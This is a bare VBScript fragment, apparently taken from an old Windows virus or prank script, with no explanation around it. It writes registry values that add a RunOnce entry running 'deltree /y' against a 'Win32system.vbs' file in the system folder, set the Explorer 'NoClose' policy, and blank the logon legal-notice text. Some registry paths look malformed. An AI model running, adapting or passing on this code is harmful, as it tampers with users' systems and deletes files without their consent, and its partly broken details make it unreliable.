Set fs=CreateObject("Scripting.FileSystemObject")
Set dir1=fs.GetSpecialFolder(0)
Set dir2=fs.GetSpecialFolder(1)
Set so=CreateObject("Scripting.FileSystemObject")
dim r
Set r=CreateObject("Wscript.Shell")
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\deltree.exe","start.exe /m deltree /y "&dir2&"\Win32system.vbs"
r.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",0,"REG_DWORD"
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption",""
r.Regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText",""
